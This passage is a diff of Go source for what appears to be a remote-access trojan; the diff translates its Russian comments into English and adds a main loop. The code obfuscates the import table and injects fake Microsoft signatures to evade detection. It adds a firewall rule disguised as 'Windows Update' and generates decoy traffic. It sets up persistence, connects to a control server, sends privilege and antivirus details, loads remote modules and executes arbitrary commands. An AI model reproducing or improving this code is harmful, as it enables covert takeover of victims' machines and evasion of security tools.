+			// Write back
 			s.WriteAt(encrypted, 0)
 		}
 	}
 }
 
-// Функция для обфускации импортов
+// Function to obfuscate import table
 func obfuscateImports() {
-	// Список импортов для обфускации
+	// List of imports to obfuscate
 	imports := map[string]string{
 		"kernel32.dll": "k" + randomString(10) + ".dll",
 		"user32.dll":   "u" + randomString(10) + ".dll",
@@ -1878,15 +1878,15 @@ func obfuscateImports() {
 	file, _ := pe.Open(exePath)
 	defer file.Close()
 	
-	// Заменяем имена DLL
+	// Replace DLL names
 	for orig, new := range imports {
 		replaceImport(file, orig, new)
 	}
 }
 
-// Функция для внедрения ложных сигнатур
+// Function to inject fake signatures
 func injectFakeSignatures() {
-	// Сигнатуры легитимных программ
+	// Legitimate program signatures
 	signatures := []string{
 		"Microsoft® Windows® Operating System",
 		"Microsoft Corporation",
@@ -1901,16 +1901,16 @@ func injectFakeSignatures() {
 	}
 	defer file.Close()
 	
-	// Добавляем сигнатуры в различные места файла
+	// Add signatures at random locations
 	for _, sig := range signatures {
 		offset, _ := rand.Int(rand.Reader, big.NewInt(1024))
 		file.WriteAt([]byte(sig), offset.Int64())
 	}
 }
 
-// Функция для маскировки сетевой активности
+// Function to mask network activity
 func maskNetworkActivity() {
-	// Создаем фейковые соединения к легитимным сервисам
+	// Create fake connections to legitimate services
 	legitimateServices := []string{
 		"update.microsoft.com:443",
 		"www.windows.com:443",
@@ -1927,21 +1927,82 @@ func maskNetworkActivity() {
 		}(service)
 	}
 	
-	// Маскируем реальные соединения
+	// Mask real connections
 	if runtime.GOOS == "windows" {
-		// Добавляем правила брандмауэра
+		// Add firewall rules
 		executeCommand(`netsh advfirewall firewall add rule name="Windows Update" dir=out action=allow protocol=TCP remoteport=443`)
 		
 	} else if runtime.GOOS == "linux" {
-		// Добавляем правила iptables
+		// Add iptables rules
 		executeCommand("iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-ports 443")
 	}
 }
 
-// Функция для генерации случайной строки
+// Function to generate random string
 func randomString(length int) string {
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	result := make([]byte, length)
+	for i := range result {
+		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
+		result[i] = charset[n.Int64()]
+	}
+	return string(result)
+}
 
-			// Выполнение команды
+// Main function
+func main() {
+	// Initialize anti-analysis protection
+	antiAnalysis()
+	
+	// Mask process
+	maskProcess()
+	
+	// Hide files
+	hideFiles()
+	
+	// Setup persistence
+	setupAutostart()
+	
+	// Initialize network masking
+	maskConnections()
+	maskDNS()
+	generateLegitTraffic()
+	
+	// Main connection loop
+	for {
+		// Connect to control server
+		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", ServerAddress, ServerPort), 30*time.Second)
+		if err != nil {
+			time.Sleep(ReconnectDelay * time.Second)
+			continue
+		}
+		
+		// Send authentication
+		conn.Write([]byte(obfuscate(SecretKey + "\n")))
+		
+		// Send system information
+		sysInfo := fmt.Sprintf("%s|%s|%s|%v|%s|%v|%v",
+			getPrivileges(),
+			runtime.GOOS,
+			runtime.GOARCH,
+			isSuperuser(),
+			getAVStatus(),
+			canEscalate(),
+			isUACEnabled())
+		
+		conn.Write([]byte(obfuscate(sysInfo + "\n")))
+		
+		// Handle commands
+		reader := bufio.NewReader(conn)
+		for {
+			command, err := reader.ReadString('\n')
+			if err != nil {
+				break
+			}
+			
+			command = strings.TrimSpace(deobfuscate(command))
+			
+			// Execute command
 			var result string
 			if strings.HasPrefix(command, "load_module:") {
 				moduleURL := strings.TrimPrefix(command, "load_module:")
@@ -1949,12 +2010,12 @@ func randomString(length int) string {
 			} else {
 				result = adaptiveExecute(command)
 			}
-
-			// Отправка результата обратно на сервер
-			conn.Write([]byte(obfuscate(result) + "\n"))
+			
+			// Send result back
+			conn.Write([]byte(obfuscate(result + "\n")))
 		}
-
-		// Переподключение через заданный интервал
+		
+		// Reconnect after delay
 		time.Sleep(ReconnectDelay * time.Second)
 	}
 }
